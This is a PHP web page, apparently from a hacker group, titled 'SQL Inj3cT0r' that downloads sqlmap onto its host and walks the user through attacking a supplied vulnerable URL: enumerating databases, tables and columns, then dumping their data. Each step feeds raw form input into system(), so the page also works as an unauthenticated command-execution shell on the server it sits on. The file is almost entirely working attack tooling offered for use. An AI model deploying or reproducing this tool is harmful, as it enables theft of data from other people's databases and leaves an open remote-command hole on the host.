<?php
session_start();
set_time_limit(0);
error_reporting(0);

if(isset($_POST['ss']))
{
    $_SESSION['sqlmap']=trim($_POST['sqlmap']);
	$_SESSION['launch']=1;
	}
 $head = '
<html>
<head>
</script>
<title>--==[[SQL Inj3cT0r By Incredible]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<STYLE>
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border			: solid 3px ;
border-color		: #333;
BACKGROUND-COLOR: white;
font: 11pt Verdana;
color: #333;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border			: dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: #FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}

A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
'; ?>
<html>
	<head>
		<?php 
		echo $head ;
		echo '

<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >

			

       <td width="100%" align=center valign="top" rowspan="1">
           <font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ SQL </font><font color=white size=5 face="comic sans ms"><b>  InJeCt0r </font><font color=green size=5 face="comic sans ms"><b>]]==--</font> <div class="hedr"> 

        <td height="10" align="left" class="td1"></td></tr><tr><td 
        width="100%" align="center" valign="top" rowspan="1"><font 
        color="red" face="comic sans ms"size="1"><b> 
        <font color=#ff9933> 
        ####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font><br><font size=3 color=#ff9933 face="comic sans ms">
        Love To: <br><font size=2 color=white face="comic sans ms">Surbhi, Mrudu, Hary, Kavi ^_^ </font><br>
        Greetz to : <br><font size=2 color=white face="comic sans ms">Code Breaker ICA , 1046 ^_^ and Team IndiShell </font><br>
        <br></font>
        <b> 
        <font color=#ff9933> 
        ####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font>
						
           </table>
       </table> 

'; 

?>
<body bgcolor=black><h3 style="text-align:center"><font color=white size=2 face="comic sans ms">
<div align=center>



<input type=submit name=dl value="Download SQLMap">

</form>
<?php

if(isset($_POST['dl']))
{
	echo "<br> Please wait... i am downloading sqlmap from github :)  <br>";
	$tmp=file_get_contents("https://github.com/sqlmapproject/sqlmap/archive/master.zip");
	file_put_contents("sqlmap.zip",$tmp);
	
	echo "<br> unpacking SQLMAP , Please have a cup of Tea 8-) <br>";
	$zip = new ZipArchive;
if ($zip->open('sqlmap.zip') === TRUE) 
{
    $zip->extractTo('.');
    $zip->close();
       
}

$loc=rename("sqlmap-master","sqlmap");
if($loc)
{
	echo "SQLMap is under directory --> ".getcwd()."/sqlmap";
		}
}
?> 



<?php
 
 if($_SESSION['sqlmap']=='')
 {
	 
	 ?>

<br><br>
	 Please type path of sqlmap.py before proceeding :)<br><br>
<form method=post>
<input type=text name=sqlmap value="sqlmap location">
<input type=submit name=ss value="set value"><p><br><br>
</form>
<?php

}

?>
<hr>
</div>

<?php
if($_SESSION['launch']=='1')
{
	?>

<br>
Type SQL Injection vulnerable URL in b0X given Below <br><br><br>
<form method=post>
<input type=text name=udata value="Injectable URL ">
<input type=submit name=btn value="extract databases"><p>
</form>


<?php
if(isset($_POST['btn']))
{
	
	
$url=$_POST['udata'];
$x=" python ".$_SESSION['sqlmap']." -u  ".$url."  --batch --dbs" ;
//die();
?>
<textarea rows=20 cols=100>
<?php system($x); ?>
</textarea>
<br>

result has been printed and you can proceed to further exploitation
<br><br>
<form method=post>
<input type=text name=url value="<?php echo $url; ?>">&nbsp
<input type=text name=db value="type database name here">&nbsp<p>
<input type=submit name=tsubmit value="extract tables">
<br>
<?php


}


if(isset($_POST['tsubmit']))
{
	$link=$_POST['url'];
	$db=$_POST[db];
	$tfinal="python ".$_SESSION['sqlmap']." -u ".$link." -D ".$db." --tables --batch";
	?>
	<textarea rows=15 cols=100>
<?php	system($tfinal); ?>
</textarea>
<br>
result showing the table names of the given database.
<br>proceed to column names

<form method=post>
<input type=text name=url value="<?php echo $link; ?>">&nbsp
<input type=text name=dbs value="<?php echo $db; ?>">&nbsp
<input type=text name=tbl value="enter table name here"><br><br>
<input type=submit name=csubmit value="extract columns">
<br>
<?php
}
if(isset($_POST['csubmit']))
{
	
	$clink=$_POST['url']; 
	$tbl=$_POST['tbl'];
	$db=$_POST['dbs'];
	$cfinal="python ".$_SESSION['sqlmap']." -u ".$clink." -D ".$db." -T " .$tbl." --columns --batch --level=3 --risk=3";
	?>
<textarea rows=20 cols=100>
	<?php
	system($cfinal);
	?>
	</textarea>
	<br> showing the results for column names..
	<form method=post>
	<input type=text name=url value="<?php echo $clink; ?>" >&nbsp  
	<input type=text name=dbs value="<?php echo $db; ?>" >&nbsp  
	
	<input type=text name=tbl value="<?php echo $tbl;?>" >&nbsp
	<input type=text name=col1 value="enter name of column"> <br><br>
	<input type=submit name=dsubmit value="Extract data">
	
	
	<?php
}
    if(isset($_POST['dsubmit'])) 
    {
    $link=$_POST['url'];
    $tbl=$_POST['tbl'];
	$db=$_POST['dbs'];
	$col=$_POST['col1'];
	$final="python ".$_SESSION['sqlmap']." -u ".$link." -D ".$db." -T " .$tbl." -C ".$col." --dump --batch --level=3 --risk=3";
    ?>
    <textarea rows=15 cols=100>
    <?php
	system($final);
    
	?>
	</textarea>
	<?php
echo "<br> task has been completed, ab mera tel nikalogay kya :| ";
    }
}
else
{
	echo '<script>alert("before proceeding, please provide sqlmap.py path :) ");</script>';
	}
	?>
